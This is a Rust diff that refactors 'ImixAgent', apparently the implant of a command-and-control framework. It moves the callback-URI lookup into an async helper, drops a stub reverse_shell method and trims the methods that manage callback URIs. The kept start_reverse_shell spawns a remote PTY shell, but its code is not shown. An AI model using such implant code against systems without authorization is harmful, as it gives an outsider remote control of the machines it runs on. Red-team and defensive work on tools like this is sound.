@@ -92,6 +92,18 @@ impl<T: Transport + Sync + 'static> ImixAgent<T> {
         }
     }
 
+    // Helper to get active callback URI.
+    // Moved from Agent trait as it's an internal helper now.
+    pub async fn get_active_callback_uri(&self) -> Result<String, String> {
+        let uris = self.callback_uris.read().await;
+        let idx = *self.active_uri_idx.read().await;
+        if idx < uris.len() {
+            Ok(uris[idx].clone())
+        } else {
+            uris.first().cloned().ok_or_else(|| "No callback URIs configured".to_string())
+        }
+    }
+
     // Helper to get config URIs for creating new transport
     pub async fn get_transport_config(&self) -> (String, Option<String>) {
         let uris = self.callback_uris.read().await;
@@ -253,10 +265,6 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
         Ok(c2::ReportTaskOutputResponse {})
     }
 
-    fn reverse_shell(&self) -> Result<(), String> {
-        Err("Reverse shell not implemented in imixv2 agent yet".to_string())
-    }
-
     fn start_reverse_shell(&self, task_id: i64, cmd: Option<String>) -> Result<(), String> {
         self.spawn_subtask(task_id, move |transport| async move {
              run_reverse_shell_pty(task_id, cmd, transport).await
@@ -281,7 +289,7 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
             .block_on(async { Ok(self.config.read().await.clone()) })
             .map_err(|e: String| e)?;
 
-        let active_uri = self.get_active_callback_uri().unwrap_or_default();
+        let active_uri = self.block_on(async { self.get_active_callback_uri().await }).unwrap_or_default();
         map.insert("callback_uri".to_string(), active_uri);
         if let Some(proxy) = &cfg.proxy_uri {
             map.insert("proxy_uri".to_string(), proxy.clone());
@@ -351,66 +359,6 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
     }
 
     fn set_callback_uri(&self, uri: String) -> Result<(), String> {
-        self.set_active_callback_uri(uri)
-    }
-
-    fn list_callback_uris(&self) -> Result<BTreeSet<String>, String> {
-        self.block_on(async {
-            let uris = self.callback_uris.read().await;
-            Ok(uris.iter().cloned().collect())
-        })
-    }
-
-    fn get_active_callback_uri(&self) -> Result<String, String> {
-        self.block_on(async {
-            let uris = self.callback_uris.read().await;
-            let idx = *self.active_uri_idx.read().await;
-            if idx < uris.len() {
-                Ok(uris[idx].clone())
-            } else {
-                uris.first().cloned().ok_or_else(|| "No callback URIs configured".to_string())
-            }
-        })
-    }
-
-    fn get_next_callback_uri(&self) -> Result<String, String> {
-        self.block_on(async {
-            let uris = self.callback_uris.read().await;
-            let idx = *self.active_uri_idx.read().await;
-            if uris.is_empty() {
-                 return Err("No callback URIs configured".to_string());
-            }
-            let next_idx = (idx + 1) % uris.len();
-            Ok(uris[next_idx].clone())
-        })
-    }
-
-    fn add_callback_uri(&self, uri: String) -> Result<(), String> {
-        self.block_on(async {
-            let mut uris = self.callback_uris.write().await;
-            if !uris.contains(&uri) {
-                uris.push(uri);
-            }
-            Ok(())
-        })
-    }
-
-    fn remove_callback_uri(&self, uri: String) -> Result<(), String> {
-        self.block_on(async {
-            let mut uris = self.callback_uris.write().await;
-            if let Some(pos) = uris.iter().position(|x| *x == uri) {
-                uris.remove(pos);
-                // Adjust index if needed
-                let mut idx = self.active_uri_idx.write().await;
-                if *idx >= uris.len() && !uris.is_empty() {
-                    *idx = 0;
-                }
-            }
-            Ok(())
-        })
-    }
-
-    fn set_active_callback_uri(&self, uri: String) -> Result<(), String> {
         self.block_on(async {
             let mut uris = self.callback_uris.write().await;
             let mut idx = self.active_uri_idx.write().await;
